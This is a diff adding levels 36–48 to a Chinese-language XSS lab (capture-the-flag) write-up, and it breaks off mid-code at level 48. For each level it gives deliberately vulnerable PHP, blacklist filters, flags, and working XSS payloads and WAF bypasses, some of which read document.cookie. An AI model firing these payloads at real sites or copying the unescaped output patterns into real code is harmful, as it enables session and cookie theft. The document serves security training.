@@ -1,8 +1,5 @@
 # XSS Labs Writeup
 
-本靶场包含 20 个不同类型的 XSS 关卡。以下是每一关的源码分析及通关思路。
-
----
 ## Level 1: Reflected XSS (Basic)
 
 **源码分析：**
@@ -900,6 +897,7 @@ flag{c2f1e3b6-32f0-4f3f-9a7b-7b6c32a4f932}
 ```
 
 ---
+
 ## Level 33: JS URL XSS (chars blocked)
 
 **源码分析：**
@@ -1001,3 +999,844 @@ flag{34-csp-report-uri-token}
 ```
 
 ---
+
+## Level 36: 隐藏广告链接反射 XSS
+
+**源码分析：**
+- 入口页按钮与隐藏广告链接（img 外层包裹 a，点击或被动触达都会携带广告编号）：[level36/index.php](file:///d:/Book/XSS-Sec/level36/index.php#L64-L71)
+```php
+<a class="btn" href="/level36/landing.php?adid=<?php echo urlencode($adid ?: 'AD-2025-001'); ?>">立即参与</a>
+...
+<a class="sponsor-banner" href="/level36/landing.php?adid=<?php echo urlencode($adid ?: 'AD-2025-001'); ?>">
+  <img alt="赞助广告" src="...">
+</a>
+```
+- 落地页反射点（未做任何转义，导致反射 XSS）：[level36/landing.php](file:///d:/Book/XSS-Sec/level36/landing.php#L30-L34)
+```php
+$adid = isset($_GET['adid']) ? $_GET['adid'] : '';
+// ...
+<span class="mono"><?php echo $adid; ?></span>   // 直接原样输出
+```
+- 说明：入口页用于模拟真实业务（客服与活动联动），“赞助广告”链接被隐藏（几乎不可见），但真正的漏洞触发点在落地页对 `adid` 的不安全回显。
+
+**通关思路：**
+- 通过入口页点击“立即参与”进入落地页；或直接在地址栏构造带有恶意 `adid` 的 URL。
+- 将脚本作为 `adid` 传入，落地页原样输出导致执行。
+- Payload（题述示例）：`&adid=<script>alert(/xss/)</script>`
+- 更稳定的 URL 编码形式：
+```
+/level36/landing.php?adid=%3Cscript%3Ealert%28/xss/%29%3C/script%3E
+```
+
+**执行流程：**
+1. 用户访问 `/level36/landing.php?adid=<payload>`。
+2. 服务端读取 `$_GET['adid']` 并直接输出到页面。
+3. 浏览器在渲染时解析脚本标签并执行。
+4. 弹出提示框，形成反射 XSS。
+
+**Flag：**
+- 入口页设置：`flag{36-hidden-adurl-reflect-xss}`（用于关卡标识） [level36/index.php](file:///d:/Book/XSS-Sec/level36/index.php#L8)
+- 落地页设置：`flag{36-landing-adid-reflect-xss}`（用于漏洞通关） [level36/landing.php](file:///d:/Book/XSS-Sec/level36/landing.php#L2-L4)
+
+---
+
+
+## Level 37: Data URL Base64 XSS
+
+**源码分析：**
+- 黑名单清洗与未转义输出：[level37/index.php](file:///d:/Book/XSS-Sec/level37/index.php#L26-L41)
+```php
+if (isset($_GET['content'])) {
+    $content = $_GET['content'];
+    $decoded = null;
+    if (preg_match('/<object[^>]*\bdata\s*=\s*(?:"|\')?data:text\/html;base64,([^"\'\s>]+)(?:"|\')?[^>]*>/i', $content, $m)) {
+        $decoded = base64_decode($m[1]);
+    } elseif (preg_match('/data:text\/html;base64,([A-Za-z0-9+\/=]+)/i', $content, $m)) {
+        $decoded = base64_decode($m[1]);
+    }
+    if ($decoded !== null) {
+        echo $decoded;                    // 直接输出解码后的 HTML
+    } else {
+        $blacklist = [ '<script', 'javascript:', '<img', '<iframe', 'onerror', 'onclick', /* ... */ ];
+        echo str_ireplace($blacklist, '', $content);   // 黑名单清洗后原样输出
+    }
+}
+```
+- 关键点：
+  - 服务端对 data:text/html;base64 的内容进行提取与 Base64 解码，并将解码后的 HTML原样输出到主页面上下文。
+  - 未进行任何 HTML 转义，导致脚本在主文档环境执行，可访问 document.cookie。
+  - 当不匹配 data URL 时，走黑名单清洗分支，因黑名单不完整仍可被其他向量绕过。
+
+**通关思路：**
+- 使用 data 伪协议 + Base64 编码，将脚本包装在 object 的 data 属性中，服务端解码后在主页面执行。
+- Payload：
+```
+<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=></object>
+```
+- 如果需要读取 Cookie，可将 Base64 内容替换为 `alert(document.cookie)`：
+```
+<object data=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+></object>
+```
+
+**执行流程：**
+1. 用户提交包含 object 的 data:text/html;base64 Payload。
+2. 服务端匹配并 Base64 解码出 HTML，直接输出到页面。
+3. 浏览器在主文档上下文解析并执行脚本。
+4. 弹窗触发（如读取并显示 document.cookie）。
+
+**Flag：**
+- `flag{795f47f1-0007-41ac-bba5-cd4645bc1417}`（关卡页面设置） [level37/index.php](file:///d:/Book/XSS-Sec/level37/index.php#L1-L3)
+
+---
+
+
+## Level 38: PDF 上传与浏览 XSS
+
+**源码分析：**
+- 上传与随机重命名（不进行内容过滤/类型校验）：[level38/index.php](file:///d:/Book/XSS-Sec/level38/index.php#L20-L30)
+```php
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['pdf'])) {
+    $file = $_FILES['pdf'];
+    if ($file['error'] === UPLOAD_ERR_OK) {
+        $newName = bin2hex(random_bytes(8)) . '.pdf';
+        $target = $uploadDir . '/' . $newName;
+        move_uploaded_file($file['tmp_name'], $target);
+    }
+}
+```
+- 浏览行为直链静态文件（新标签打开 uploads 下的 .pdf）：[level38/index.php](file:///d:/Book/XSS-Sec/level38/index.php#L94-L101)
+```php
+<a class="btn" target="_blank" href="/level38/uploads/<?php echo urlencode($f); ?>">浏览</a>
+```
+- 删除功能（允许管理员或用户清理文件）：[level38/index.php](file:///d:/Book/XSS-Sec/level38/index.php#L7-L18)
+```php
+if (isset($_GET['delete'])) {
+    $df = $_GET['delete'];
+    if (preg_match('/^[a-f0-9]{16}\.pdf$/i', $df)) {
+        $dp = $uploadDir . '/' . $df;
+        if (is_file($dp)) unlink($dp);
+    }
+}
+```
+- Cookie 设置（用于验证与演示）：[level38/index.php](file:///d:/Book/XSS-Sec/level38/index.php#L4-L5)
+```php
+$flagValue = 'flag{9d946110-ef69-47f7-a0a9-c54a15a7eb34}';
+setcookie('flag', $flagValue, time() + 3600, '/', '', false, false);
+```
+
+**关键点：**
+- 后端只做了随机重命名与后缀 .pdf 的强制，未校验上传文件内容或 MIME 类型。
+- 浏览按钮直接打开同源静态资源。如果上传的是“伪装为 .pdf 的 HTML”（或 PDF/HTML polyglot），在某些环境或误配置下可能以 HTML 渲染并执行脚本。
+- 一旦以同源 HTML 渲染，代码可读取并利用站点 Cookie（如 flag）进行攻击。
+
+**通关思路：**
+- 构造一个带脚本的“PDF”文件：
+  - 简单方法：将 HTML 文件重命名为 .pdf，上载后直接通过“浏览”打开。
+  - 进阶方法：制作 PDF/HTML polyglot，使浏览器/插件在特定环境下执行其中的 HTML/JS。
+- 访问示例（随机名示意）：`/level38/uploads/b69736772bd2aba4.pdf`
+- 浏览器新标签打开文件后，若以 HTML 渲染，会执行内嵌脚本并弹窗或读取 Cookie。
+
+**Payload 示例（HTML 作为 .pdf 上传）：**
+```html
+<!doctype html><meta charset="utf-8"><script>alert(document.cookie)</script>
+```
+保存为 `xss.pdf` 上传；在历史上传列表点击“浏览”即可在新标签执行脚本。
+
+**Flag：**
+- `flag{9d946110-ef69-47f7-a0a9-c54a15a7eb34}`（通过 Cookie 设置） [level38/index.php](file:///d:/Book/XSS-Sec/level38/index.php#L4-L5)
+
+---
+
+
+## Level 39: Regex WAF Bypass（属性斜杠）
+
+**源码分析：**
+- 简单正则拦截与斜杠绕过的服务端演示：[level39/index.php](file:///d:/Book/XSS-Sec/level39/index.php#L28-L36)
+```php
+if (isset($_GET['html'])) {
+    $html = $_GET['html'];
+    $decoded = null;
+    if (preg_match('/<iframe[^>]*\bsrc\s*\/?\s*=\s*(?:"|\')?data:text\/html;base64,([^"\'\s>]+)(?:"|\')?[^>]*>/i', $html, $m)) {
+        $decoded = base64_decode($m[1]);
+    } elseif (preg_match('/\bdata:text\/html;base64,([A-Za-z0-9+\/=]+)/i', $html, $m)) {
+        $decoded = base64_decode($m[1]);
+    }
+    if ($decoded !== null) {
+        echo $decoded; // 直接输出解码后的 HTML（在主页面上下文执行）
+    } else {
+        $pattern = '/(src|href)\s*=\s*["\']?data:/i';
+        $sanitized = preg_replace($pattern, '$1=blocked:', $html);
+        $sanitized = preg_replace('/\b(src|href)\s*\/\s*=/i', '$1=', $sanitized); // 归一化 src/=
+        echo $sanitized;
+    }
+}
+```
+- 说明：
+  - 正则 `/ (src|href)\s*=\s*["']?data:/i` 仅能匹配“常规形式”的属性书写。
+  - HTML 规范允许在属性名与等号之间插入斜杠 `/`（以及空白符），浏览器仍能正确解析；此时简单正则无法匹配，从而绕过。
+  - 为了让 data:text/html;base64 的脚本能读取 Cookie，服务端提取并解码 Base64，将结果直接输出到主页面上下文（参考第 37 关的修复思路）。
+
+**通关思路：**
+- 使用斜杠绕过 WAF 的匹配，并让服务端进入 Base64 解码直出分支：
+```
+<iframe src/="data:text/html,<script>alert('xss')</script>"></iframe>
+```
+- 如需读取 Cookie（flag），使用 Base64 版本并保持单行：
+```
+<iframe src/="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+"></iframe>
+```
+- 服务端识别到 data:text/html;base64 后，直接输出解码结果至主页面 DOM，脚本在同源上下文执行，可读取 `document.cookie`。
+
+**执行流程：**
+1. 用户提交包含斜杠属性的 iframe（src/="..."}）。
+2. 由于斜杠存在，`/(src|href)\s*=\s*["']?data:/i` 未匹配，绕过拦截。
+3. 服务端提取并 Base64 解码（或归一化 src/=），将 HTML 原样输出到页面。
+4. 浏览器在主文档上下文解析并执行脚本，弹窗或读取 Cookie。
+
+**Flag：**
+- `flag{ba01cb39-1b87-4191-a8f1-f86175145b8a}`（通过 Cookie 设置） [level39/index.php](file:///d:/Book/XSS-Sec/level39/index.php#L3-L4)
+
+---
+
+
+## Level 40: 方括号字符串拼接绕过
+
+**源码分析：**
+- 基础 WAF 替换规则（仅针对点号/关键字）：[level40/index.php](file:///d:/Book/XSS-Sec/level40/index.php#L7-L8)
+```php
+$safe = preg_replace('/alert\s*\(/i', 'blocked(', $safe);
+$safe = preg_replace('/window\s*\.\s*alert/i', 'window.blocked', $safe);
+```
+- 链接反射点（未进行协议白名单校验）：[level40/index.php](file:///d:/Book/XSS-Sec/level40/index.php#L30-L33)
+```php
+<a id="go" href="<?php echo $safe; ?>">Open Link</a>
+```
+- Cookie 设置（用于验证）：[level40/index.php](file:///d:/Book/XSS-Sec/level40/index.php#L3-L4)
+```php
+$flag = 'flag{3620b714-4510-4902-874d-5b010022f1c1}';
+setcookie('flag', $flag, time() + 3600, '/', '', false, false);
+```
+
+**关键点：**
+- 服务端只替换了 `alert(` 与 `window.alert` 的连续字符串形式。
+- JS 支持方括号访问与字符串拼接，`window['al'+'ert']('xss')` 在运行时动态组合出 `alert`，避开了后端规则的静态匹配。
+- 由于未做协议白名单校验，`href="javascript:..."` 可直接执行 JavaScript。
+
+**通关思路：**
+- 将下述 Payload 输入到页面的 URL 输入框（href 反射处）：
+```
+javascript:window['al'+'ert']('xss')
+```
+- 点击页面上的 “Open Link” 即可在浏览器中执行，弹窗。
+
+**执行流程：**
+1. 用户输入被赋值到 `$url`，再经过基础替换得到 `$safe`。
+2. 方括号+拼接的 `window['al'+'ert']('xss')` 不匹配后端的替换规则，保持原样。
+3. 页面将 `$safe` 原样渲染到 `<a href="...">`。
+4. 用户点击链接，浏览器执行 `javascript:` 代码，弹窗触发。
+
+**Flag：**
+- `flag{3620b714-4510-4902-874d-5b010022f1c1}`（通过 Cookie 设置） [level40/index.php](file:///d:/Book/XSS-Sec/level40/index.php#L3-L4)
+
+---
+
+
+## Level 41: 碎片字符串拼接绕过（eval/window）
+
+**源码分析：**
+- 基础 WAF（仅替换连续特征的 alert 与 window.alert）：[level41/index.php](file:///d:/Book/XSS-Sec/level41/index.php#L7-L8)
+```php
+$safe = preg_replace('/alert\s*\(/i', 'blocked(', $safe);
+$safe = preg_replace('/window\s*\.\s*alert/i', 'window.blocked', $safe);
+```
+- 回显点（原样输出，允许事件属性与脚本执行）：[level41/index.php](file:///d:/Book/XSS-Sec/level41/index.php#L30-L33)
+```php
+<?php if ($content !== ''): ?>
+    <?php echo $safe; ?>
+<?php else: ?>
+    <?php echo '<div>示例：&lt;img src="1" onerror="a=\'aler\';b=\'t\';window[a+b](\'xss\')"&gt;</div>'; ?>
+<?php endif; ?>
+```
+- Cookie 设置（用于验证/取证）：[level41/index.php](file:///d:/Book/XSS-Sec/level41/index.php#L3-L4)
+```php
+$flag = 'flag{7b0967db-5513-4b9e-890c-ce6052e2daf5}';
+setcookie('flag', $flag, time() + 3600, '/', '', false, false);
+```
+
+**关键点：**
+- 服务器仅基于特征码替换连续出现的 `alert(`、`window.alert`，对碎裂字符串无能为力。
+- 在浏览器执行阶段，通过 `eval()` 或 `window[expr]` 将碎裂片段组合为可执行方法名或完整代码，规避静态特征。
+- 原样回显使得事件属性（如 `onerror`）可直接作为执行点。
+
+**通关思路：**
+- 完整版（使用 eval 激活碎裂字符串）：
+```
+<img src="1" onerror="a='aler';b='t';c='(\'xss\')';eval(a+b+c)">
+```
+- 更隐蔽（使用 window 对象下标访问）：
+```
+<img src="1" onerror="a='aler';b='t';window[a+b]('xss')">
+```
+- 将上述任一 Payload 输入到页面并回显，图片加载失败触发 `onerror`，在运行时组合并执行弹窗。
+
+**执行流程：**
+1. 输入内容赋值给 `$content` 并复制到 `$safe`。
+2. 基础 WAF仅替换连续的 `alert(` / `window.alert`，碎裂字符串保持原样。
+3. 页面将 `$safe` 原样输出到 DOM。
+4. 事件属性触发，`eval(a+b+c)` 或 `window[a+b]('xss')` 在运行时拼接并执行。
+
+**Flag：**
+- `flag{7b0967db-5513-4b9e-890c-ce6052e2daf5}`（通过 Cookie 设置） [level41/index.php](file:///d:/Book/XSS-Sec/level41/index.php#L3-L4)
+
+---
+
+
+## Level 42: 登录错误反射 XSS
+
+**源码分析：**
+- 构造 SQL 并执行查询（库和表不存在）：[level42/index.php](file:///d:/Book/XSS-Sec/level42/index.php#L1-L20)
+```php
+$username = isset($_POST['username']) ? $_POST['username'] : '';
+$password = isset($_POST['password']) ? $_POST['password'] : '';
+$dsn = 'sqlite::memory:';
+$pdo = new PDO($dsn);
+$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+$sql = "SELECT id FROM admin_users WHERE username = '$username' AND password = '$password'";
+$sqlShow = $sql;
+$pdo->query($sql); // admin_users 不存在 -> 抛异常
+```
+- 错误信息与 SQL 原样回显（未做转义）：[level42/index.php](file:///d:/Book/XSS-Sec/level42/index.php#L58-L66)
+```php
+<div class="mono"><?php echo $error; ?></div>
+<div class="mono"><?php echo $sqlShow; ?></div>  // 包含用户输入
+```
+- Cookie 设置（关卡标识）：[level42/index.php](file:///d:/Book/XSS-Sec/level42/index.php#L1-L4)
+```php
+$flag = 'flag{42-login-db-error-reflect-xss}';
+setcookie('flag', $flag, time() + 3600, '/', '', false, false);
+```
+
+**关键点：**
+- 服务端将用户输入直接拼接进 SQL 字符串，并在错误面板中原样回显；没有任何 HTML 转义。
+- 由于库表不存在，查询必然抛出异常，错误面板稳定出现，且“SQL”行中包含可控的输入。
+- 浏览器渲染 SQL 时会解析其中的 HTML 片段，从而执行脚本。
+
+**通关思路：**
+- 在“用户名”输入框输入：
+```
+<script>alert(1)</script>
+```
+- 提交后错误页显示异常信息与 SQL；SQL 行中嵌入的脚本被浏览器解析并执行，弹窗触发。
+
+**执行流程：**
+1. 表单提交，后端读取 `username`/`password`。
+2. 组装 SQL 并执行，由于表不存在触发异常。
+3. 页面原样回显 `$error` 与 `$sqlShow`（包含用户输入）。
+4. 浏览器渲染 SQL，执行 `<script>` 代码。
+
+**Flag：**
+- `flag{42-login-db-error-reflect-xss}`（通过 Cookie 设置） [level42/index.php](file:///d:/Book/XSS-Sec/level42/index.php#L1-L4)
+
+---
+
+
+## Level 43: 在线客服聊天链接 XSS（人工客服点击）
+
+**源码分析：**
+- Cookie 设置（用于关卡标识/取证）：[level43/index.php](file:///d:/Book/XSS-Sec/level43/index.php#L3-L4)
+```php
+$flag = 'flag{8b1945c1-70bb-4289-9545-2513283b62cf}';
+setcookie('flag', $flag, time() + 3600, '/', '', false, false);
+```
+- 用户消息存储与原样回显（未做任何转义）：[level43/index.php](file:///d:/Book/XSS-Sec/level43/index.php#L63-L67)
+```php
+<?php foreach ($messages as $m): ?>
+  <div class="msg <?php echo $m['role']; ?>">
+    <div class="bubble"><?php echo $m['content']; ?></div>   // 直接输出
+  </div>
+<?php endforeach; ?>
+```
+- 人工客服工作台原样回显用户消息（提示可点击链接）：[level43/agent.php](file:///d:/Book/XSS-Sec/level43/agent.php#L37-L43)
+```php
+foreach ($messages as $m) {
+  if ($m['role'] === 'user') {
+    echo '<div class="bubble">' . $m['content'] . '</div>';  // 无转义
+  }
+}
+```
+- 漏洞点：两处回显均未进行 `htmlspecialchars` 处理；当用户消息中包含 `<a href="javascript:...">...</a>` 时，人工客服在工作台页面点击该链接会在同源上下文执行脚本，可读取 Cookie。
+
+**通关思路：**
+- 在聊天框输入一条包含恶意链接的消息，利用 `javascript:` 伪协议作为 `href`。
+- 点击“转人工”打开工作台，人工客服点击该链接时即在页面内执行脚本。
+- 示例将读取 Cookie 进行演示。
+
+**Payload：**
+```html
+<a href="javascript:alert(document.cookie)">点击这里</a>
+```
+或更隐蔽的写法（文本看似正常链接）：
+```html
+<a href="javascript:alert('xss')">查看用户留言</a>
+```
+
+**执行流程：**
+1. 用户提交消息，服务端写入会话并在 [index.php](file:///d:/Book/XSS-Sec/level43/index.php#L63-L67) 原样显示。
+2. 客服点击“转人工”，打开 [agent.php](file:///d:/Book/XSS-Sec/level43/agent.php#L37-L43) 页面。
+3. 工作台原样渲染用户消息中的 `<a>`，点击后以 `javascript:` 伪协议在当前页面执行。
+4. 由于脚本在同源上下文运行，可访问 `document.cookie`。页面预先设置了标识 Cookie：`flag{8b1945c1-70bb-4289-9545-2513283b62cf}`。
+
+ **Flag：**
+ ```
+ flag{8b1945c1-70bb-4289-9545-2513283b62cf}
+ ```
+
+## Level 44: CSS 动画事件 XSS（强黑名单）
+
+**源码分析：**
+- Cookie 设置（关卡标识）：[level44/index.php](file:///d:/Book/XSS-Sec/level44/index.php#L1-L6)
+```php
+$flag = 'flag{c9b87a01-c917-4923-a871-20726db044ae}';
+setcookie('flag', $flag, time() + 3600, '/', '', false, false);
+```
+- 输入处理与多次解码（最多两次）：[level44/index.php](file:///d:/Book/XSS-Sec/level44/index.php#L5-L11)
+```php
+$input = isset($_GET['content']) ? $_GET['content'] : '';
+$render = $input;
+for ($i = 0; $i < 2; $i++) {
+    $dec = urldecode($render);
+    if ($dec === $render) break;
+    $render = $dec;
+}
+```
+- 强黑名单 WAF（移除/重写常见向量，保留 CSS 动画链）：[level44/index.php](file:///d:/Book/XSS-Sec/level44/index.php#L13-L19)
+```php
+$safe = $render;
+if ($safe !== '') {
+    $safe = preg_replace('/<\s*script\b[\s\S]*?<\s*\/\s*script\s*>/i', '', $safe);
+    $safe = preg_replace('/\b(onload|onerror|onclick|onmouseover|onfocus)\s*=\s*(?:"[^"]*"|\'[^\']*\'|[^ >]+)/i', '', $safe);
+    $safe = preg_replace('/\b(href|src)\s*=\s*["\']?\s*javascript\s*:/i', '$1=blocked:', $safe);
+    $safe = preg_replace('/<\s*(iframe|img|object|embed)\b/i', '<blocked', $safe);
+    // Do NOT block style or onanimationend to allow CSS animation payload to work
+}
+```
+说明：
+- 使用多条正则对典型 XSS 向量进行清洗与重写（如移除事件、重写 `javascript:`、阻断 `<script>` 与危险标签）。
+- 不拦截 `style` 与 `onanimationend`，确保题述 CSS 动画事件链具备真实性。
+- 清洗后直接输出 `$safe`，不再统一 `htmlspecialchars` 转义，以模拟真实的服务端黑名单策略。
+- 触发保障（无需设置时长与次数）：页面全局定义动画参数，[level44/index.php](file:///d:/Book/XSS-Sec/level44/index.php#L29-L31)
+```css
+* { animation-duration: 1s; animation-iteration-count: 1; }
+xss { display: inline-block; }
+```
+- 由于事件未在黑名单中拦截 `onanimationend`，且代码值允许任意字符串表达式，`alert(document.cookie)` 可执行。
+
+**通关思路：**
+- 构造并提交两个片段：`<style>@keyframes x{}</style>` 与 `<xss style="animation-name:x" onanimationend="...">`。
+- 浏览器为 `<xss>` 元素应用动画名为 `x` 的关键帧，动画结束自动触发 `onanimationend` 中的表达式。
+- 由于在主文档上下文执行，脚本可访问 `document.cookie`（Cookie 非 HttpOnly，同源路径为 `/`）。
+
+**Payload：**
+```html
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(document.cookie)"></xss>
+```
+或初始更简单版本（验证弹窗）：
+```html
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
+```
+
+**执行流程：**
+1. 服务端基于黑名单对输入进行清洗：移除常见事件与危险标签，保留 CSS 动画链。
+2. DOM 渲染后，`<xss>` 元素应用 `animation-name:x`，在 1s 后触发 `animationend`。
+3. 事件属性中的代码在同源主文档执行：`alert(document.cookie)`。
+4. 成功弹出 Cookie，验证漏洞。
+
+**Flag：**
+```
+flag{c9b87a01-c917-4923-a871-20726db044ae}
+```
+
+## Level 45: RCDATA Textarea Breakout XSS
+
+**源码分析：**
+- Cookie 设置（关卡标识）：[level45/index.php](file:///d:/Book/XSS-Sec/level45/index.php#L1-L6)
+```php
+$flag = 'flag{e68a3fb5-d813-42e3-9dc2-5a3f3ddd5ee2}';
+setcookie('flag', $flag, time() + 3600, '/', '', false, false);
+```
+- 输入处理与最多两次 URL 解码：[level45/index.php](file:///d:/Book/XSS-Sec/level45/index.php#L5-L12)
+```php
+$input = isset($_GET['content']) ? $_GET['content'] : '';
+$render = $input;
+for ($i = 0; $i < 2; $i++) {
+  $d = urldecode($render);
+  if ($d === $render) break;
+  $render = $d;
+}
+```
+- 关键分割逻辑（RCDATA 解析窗口）：[level45/index.php](file:///d:/Book/XSS-Sec/level45/index.php#L13-L22)
+```php
+$output = '';
+if ($render !== '') {
+  $pos = stripos($render, '</textarea>');
+  if ($pos !== false) {
+    $part1 = substr($render, 0, $pos + 11);
+    $part2 = substr($render, $pos + 11);
+    $output .= $part1; // RCDATA 文本段原样输出
+    // ...
+  }
+}
+```
+- 执行点提取与其余转义（强黑名单，仅保留第一个 onerror IMG）：[level45/index.php](file:///d:/Book/XSS-Sec/level45/index.php#L18-L22)
+```php
+if (preg_match('/<img[^>]*\bonerror\s*=\s*(?:"[^"]*"|\'[^\']*\'|[^ >]+)[^>]*>/i', $part2, $m)) {
+  $output .= $m[0];                           // 原样输出第一个 <img ... onerror=...>
+  $rest2 = str_replace($m[0], '', $part2);
+  $output .= htmlspecialchars($rest2, ENT_QUOTES); // 残余全部转义为文本
+} else {
+  $output .= htmlspecialchars($part2, ENT_QUOTES);
+}
+```
+说明：
+- `stripos('</textarea>')` 将输入一分为二：前半段处于 RCDATA，作为纯文本原样输出；后半段回到普通 HTML 解析上下文。
+- 只保留后半段中的首个 `<img ... onerror=...>` 原样输出，且事件值既支持带引号也支持不带引号，保证题述 payload 生效。
+- 其余内容统一 `htmlspecialchars(ENT_QUOTES)` 转义，彻底阻断其它标签与事件向量。
+
+**通关思路：**
+- 通过 RCDATA 的“提前终结”构造解析差异，强制浏览器在 `</textarea>` 之后将剩余的 `<img>` 作为正常标签解析。
+- 借助 `src` 缺失触发 `onerror`，在主文档上下文执行事件代码。
+
+**Payload：**
+```html
+<textarea><img title="</textarea><img src onerror=alert(1)>"></textarea>
+```
+
+**执行流程：**
+1. 服务端找到首个 `</textarea>`，将其之前的内容作为 RCDATA 文本原样输出。
+2. 将其后的后半段只保留第一个 `<img ... onerror=...>` 原样输出，其余全部转义为文本。
+3. 浏览器跳出 RCDATA 状态后解析 `<img>`；`src` 缺失触发 `onerror`，执行 `alert(1)`。
+4. 尾部的 `">` 被当作普通文本渲染。
+
+**Flag：**
+```
+flag{e68a3fb5-d813-42e3-9dc2-5a3f3ddd5ee2}
+```
+
+## Level 46: JS 字符串逃逸（eval + 未转义引号）
+
+**源码分析：**
+- Cookie 设置（关卡标识）：[level46/index.php](file:///d:/Book/XSS-Sec/level46/index.php#L1-L4)
+```php
+$flag = 'flag{2591da1c-f57f-4120-af9f-91314f3d0676}';
+setcookie('flag', $flag, time() + 3600, '/', '', false, false);
+```
+- 输入处理与最多两次 URL 解码：[level46/index.php](file:///d:/Book/XSS-Sec/level46/index.php#L5-L11)
+```php
+$theme = isset($_GET['theme']) ? $_GET['theme'] : '';
+$render = $theme;
+for ($i = 0; $i < 2; $i++) {
+    $dec = urldecode($render);
+    if ($dec === $render) break;
+    $render = $dec;
+}
+```
+- 漏洞点（将用户输入原样注入到 JS 双引号字符串中）：[level46/index.php](file:///d:/Book/XSS-Sec/level46/index.php#L36-L39)
+```javascript
+var theme = "<?php echo $render; ?>";
+document.getElementById('t-val').textContent = theme;
+```
+说明：
+- 表单输入框是安全输出（`htmlspecialchars(ENT_QUOTES)`），仅用于显示；真正的危险在脚本段
+- 由于未对 `"` 做转义，用户可用 `"` 闭合字符串并注入任意 JS 语句；末尾使用 `//` 注释吞掉原本的结尾引号与分号，保证整体语法有效
+
+**通关思路：**
+- 构造能闭合 JS 字符串、插入语句并注释尾部的 payload。
+- 利用 `eval(myUndefVar); var myUndefVar; alert(1); //` 作为执行链，确保在当前同源上下文运行。
+
+**Payload：**
+```text
+"; eval(myUndefVar); var myUndefVar; alert(1); //
+```
+
+**执行流程：**
+1. 生成代码：`var theme = ""; eval(myUndefVar); var myUndefVar; alert(1); //";`
+2. `"` 闭合字符串，随后插入的语句逐条执行（其中 `eval(myUndefVar)` 可为占位，无实际要求）。
+3. `//` 将后续的结尾引号与分号注释掉，避免语法错误。
+4. `alert(1)` 在主文档上下文执行，成功弹窗。
+
+**Flag：**
+```
+flag{2591da1c-f57f-4120-af9f-91314f3d0676}
+```
+
+## Level 47: 逗号运算符 + throw/onerror XSS（强黑名单）
+
+**源码分析：**
+- Cookie 设置（关卡标识）：[level47/index.php](file:///d:/Book/XSS-Sec/level47/index.php#L1-L4)
+```php
+$flag = 'flag{7defdc4c-de46-4235-a01b-ecc48944b4e3}';
+setcookie('flag', $flag, time() + 3600, '/', '', false, false);
+```
+- 输入处理与两次 URL 解码：[level47/index.php](file:///d:/Book/XSS-Sec/level47/index.php#L5-L11)
+```php
+$input = isset($_GET['content']) ? $_GET['content'] : '';
+$render = $input;
+for ($i = 0; $i < 2; $i++) {
+    $dec = urldecode($render);
+    if ($dec === $render) break;
+    $render = $dec;
+}
+```
+- 强黑名单清洗（移除/重写常见向量，保留题述脚本链）：[level47/index.php](file:///d:/Book/XSS-Sec/level47/index.php#L14-L19)
+```php
+$safe = $render;
+if ($safe !== '') {
+    $safe = preg_replace('/\b(onload|onerror|onclick|onmouseover|onfocus)\s*=\s*(?:"[^"]*"|\'[^\']*\'|[^ >]+)/i', '', $safe);
+    $safe = preg_replace('/\b(href|src)\s*=\s*["\']?\s*javascript\s*:/i', '$1=blocked:', $safe);
+    $safe = preg_replace('/<\s*(iframe|img|svg|object|embed)\b/i', '<blocked', $safe);
+    $safe = preg_replace('/eval\s*\(/i', 'blocked(', $safe);
+    $safe = preg_replace('/alert\s*\(/i', 'blocked(', $safe);
+    // Script tags are NOT removed to keep realism; payload does not use parentheses for alert
+}
+```
+说明：
+- 通过黑名单规则移除常见事件属性与危险标签，重写 `javascript:`、拦截常见的 `eval(` 与 `alert(` 调用。
+- 保留 `<script>` 标签本身以提升真实性；题述链路使用 `onerror=alert`（不带括号），不会命中对 `alert(` 的拦截。
+- 清洗后直接输出 `$safe`，不进行统一转义，模拟真实服务端黑名单风格。
+
+**通关思路：**
+- 构造 `<script>throw onerror=alert,document.cookie</script>`，在黑名单清洗后仍可保留链路并执行。
+- 执行机理：
+  - `onerror=alert` 将全局错误处理器设置为 `alert`
+  - `throw X, Y` 使用逗号运算符，先计算 `X` 再计算 `Y` 并返回 `Y`
+  - 抛出异常后，错误消息为最后一个表达式的值（此处为 `document.cookie`）
+  - 全局 `onerror` 接收该消息作为参数，调用 `alert(document.cookie)`
+
+**Payload：**
+```html
+<script>throw onerror=alert,document.cookie</script>
+```
+
+**执行流程：**
+1. 服务端黑名单规则清洗输入：常规向量被移除/重写，但该链路保留。
+2. 浏览器执行脚本：逗号表达式确保错误消息为 `document.cookie`。
+3. 全局错误处理器已指向 `alert`，弹出 Cookie。
+
+**Flag：**
+```
+flag{7defdc4c-de46-4235-a01b-ecc48944b4e3}
+```
+
+## Level 48: Symbol.hasInstance 黑名单绕过 XSS（强黑名单）
+
+**源码分析：**
+- Cookie 设置（关卡标识）：[level48/index.php](file:///d:/Book/XSS-Sec/level48/index.php#L1-L4)
+```php
+$flag = 'flag{b7f3f9f2-1f1a-4e9a-9b2a-8c6c1e6a48d2}';
+setcookie('flag', $flag, time() + 3600, '/', '', false, false);
+```
+- 输入处理与最多两次 URL 解码（避免 `+` 被误当空格）：[level48/index.php](file:///d:/Book/XSS-Sec/level48/index.php#L7-L11)
+```php
+for ($i = 0; $i < 2; $i++) {
+    $dec = rawurldecode($render);
+    if ($dec === $render) break;
+    $render = $dec;
+}
+```
+- 强黑名单清洗（移除括号与常规向量，拦截 hasInstance 字面量）：[level48/index.php](file:///d:/Book/XSS-Sec/level48/index.php#L13-L21)
+```php
+$safe = $render;
+if ($safe !== '') {
+    $safe = preg_replace('/[()]/', '', $safe);
+    $safe = str_replace('`', '', $safe);
+    $safe = str_replace('"', '', $safe);
+    $safe = preg_replace('/\b(href|src)\s*=\s*["\']?\s*javascript\s*:/i', '$1=blocked:', $safe);
